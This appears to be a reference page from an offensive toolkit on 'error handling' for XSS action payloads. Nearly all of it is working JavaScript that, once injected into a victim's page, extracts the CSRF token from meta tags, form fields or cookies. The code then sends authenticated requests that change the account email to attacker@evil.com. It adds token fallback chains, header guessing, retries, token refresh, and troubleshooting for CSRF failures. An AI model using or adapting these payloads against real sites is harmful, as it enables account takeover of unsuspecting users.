# Error Handling

Error handling patterns for XSS action payloads.

## Error Handling Levels

### Level 0: Minimal (Default)

**Use when:** Simplicity is paramount, debugging not needed.

```javascript
(function() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  if (!csrfToken) return;

  fetch('/target', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
    credentials: 'same-origin',
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
})();
```

**Characteristics:**
- Silent failure on missing token
- No response handling
- No error logging
- Smallest payload size

---

### Level 1: Token Validation

**Use when:** Need to confirm token extraction works.

```javascript
(function() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  if (!csrfToken) {
    console.error('CSRF token not found');
    return;
  }

  fetch('/target', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
    credentials: 'same-origin',
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
})();
```

**Characteristics:**
- Logs missing token
- No response handling
- Useful for initial testing

---

### Level 2: Response Status Check

**Use when:** Need to verify action succeeded.

```javascript
(function() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  if (!csrfToken) {
    console.error('CSRF token not found');
    return;
  }

  fetch('/target', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
    credentials: 'same-origin',
    body: JSON.stringify({ email: 'attacker@evil.com' })
  })
  .then(response => {
    if (response.ok) {
      console.log('Action succeeded:', response.status);
    } else {
      console.error('Action failed:', response.status);
    }
  })
  .catch(error => {
    console.error('Request error:', error.message);
  });
})();
```

**Characteristics:**
- Confirms success/failure
- Logs HTTP status
- Catches network errors

---

### Level 3: Full Response Handling

**Use when:** Need to capture response data or verify specific outcomes.

```javascript
(function() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  if (!csrfToken) {
    console.error('CSRF token not found');
    return;
  }

  fetch('/target', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
    credentials: 'same-origin',
    body: JSON.stringify({ email: 'attacker@evil.com' })
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    console.log('Success:', data);
    // Verify expected response
    if (data.user && data.user.email === 'attacker@evil.com') {
      console.log('User created successfully');
    }
  })
  .catch(error => {
    console.error('Failed:', error.message);
  });
})();
```

---

## Fallback Patterns

### Token Extraction Fallback Chain

**Use when:** Uncertain of token location.

```javascript
(function() {
  // Try multiple token sources in order
  const csrfToken =
    document.querySelector('meta[name="csrf-token"]')?.content ||
    document.querySelector('meta[name="_csrf"]')?.content ||
    document.querySelector('input[name="_token"]')?.value ||
    document.querySelector('input[name="csrfmiddlewaretoken"]')?.value ||
    document.querySelector('input[name="authenticity_token"]')?.value ||
    getCookie('XSRF-TOKEN') ||
    getCookie('csrftoken');

  if (!csrfToken) {
    console.error('No CSRF token found in any location');
    return;
  }

  // Continue with request...
})();

function getCookie(name) {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}
```

---

### Multi-Header Fallback

**Use when:** Uncertain of expected header name.

```javascript
(function() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  if (!csrfToken) return;

  // Try with different header names
  const headers = {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken,
    'X-CSRFToken': csrfToken,
    'X-XSRF-TOKEN': csrfToken,
    'CSRF-Token': csrfToken
  };

  fetch('/target', {
    method: 'POST',
    headers: headers,
    credentials: 'same-origin',
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
})();
```

**Note:** Some frameworks ignore unknown headers, others may error. Test in target environment.

---

## Retry Patterns

### Simple Retry

**Use when:** Request might fail due to transient issues.

```javascript
(async function() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
  if (!csrfToken) return;

  const maxRetries = 3;
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch('/target', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
        credentials: 'same-origin',
        body: JSON.stringify({ email: 'attacker@evil.com' })
      });

      if (response.ok) {
        console.log('Success on attempt', i + 1);
        return;
      }
    } catch (error) {
      console.log('Attempt', i + 1, 'failed:', error.message);
    }

    // Wait before retry
    await new Promise(r => setTimeout(r, 1000));
  }

  console.error('All retries failed');
})();
```

---

### Token Refresh Retry

**Use when:** Token may have expired between extraction and use.

```javascript
(async function() {
  async function getToken() {
    // Re-fetch page to get fresh token
    const response = await fetch(window.location.href);
    const html = await response.text();
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    return doc.querySelector('meta[name="csrf-token"]')?.content;
  }

  let csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;

  const response = await fetch('/target', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
    credentials: 'same-origin',
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });

  // If 403/419, token may be expired - refresh and retry
  if (response.status === 403 || response.status === 419) {
    console.log('Token expired, refreshing...');
    csrfToken = await getToken();
    if (!csrfToken) return;

    await fetch('/target', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
      credentials: 'same-origin',
      body: JSON.stringify({ email: 'attacker@evil.com' })
    });
  }
})();
```

---

## Error Codes Reference

### HTTP Status Codes

| Code | Meaning | Likely Cause |
|------|---------|--------------|
| 200 | Success | Action completed |
| 201 | Created | Resource created successfully |
| 400 | Bad Request | Malformed payload, missing fields |
| 401 | Unauthorized | Session expired, need re-auth |
| 403 | Forbidden | CSRF validation failed, wrong token |
| 404 | Not Found | Wrong endpoint path |
| 405 | Method Not Allowed | Wrong HTTP method |
| 419 | Page Expired (Laravel) | CSRF token expired |
| 422 | Unprocessable Entity | Validation failed, invalid data |
| 500 | Server Error | Backend error, check payload format |

### Troubleshooting by Error

**403 Forbidden:**
1. Check CSRF header name
2. Verify token is fresh
3. Ensure token came from same session
4. Check if token is URL-encoded when extracted from cookie

**419 Page Expired (Laravel):**
1. Token expired - re-fetch from page
2. Session mismatch - ensure same-origin credentials

**422 Unprocessable Entity:**
1. Check required fields in payload
2. Verify field names match backend expectation
3. Check data types (string vs number vs boolean)

**CORS Errors:**
1. Verify same-origin request
2. Check credentials mode
3. Ensure no custom headers that trigger preflight
